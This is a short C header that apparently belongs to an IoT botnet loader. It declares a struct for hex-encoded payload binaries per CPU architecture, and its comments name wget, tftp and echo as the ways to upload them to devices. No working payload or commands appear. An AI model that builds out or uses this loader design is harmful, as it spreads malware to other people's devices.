#ifndef _LOADER_BINARY_H
#define _LOADER_BINARY_H

/* ============================================================================
 * BINARY MODULE - Architecture Payload Management
 * ============================================================================
 * Stores hex-encoded binaries for each architecture
 * Architectures: arm, arm5, arm6, arm7, mips, mpsl, x86, x86_64, ppc, etc.
 * Upload methods: wget (primary), tftp (fallback), echo (last resort)
 * ============================================================================ */

#include <stdbool.h>
#include "includes.h"

/* Type definitions */
typedef bool BOOL;
#define TRUE true
#define FALSE false

struct binary {
    char *arch;
    char *hex_payload;
    int hex_payload_len;
};

BOOL binary_init(void);
char *binary_get_by_arch(char *);

#endif
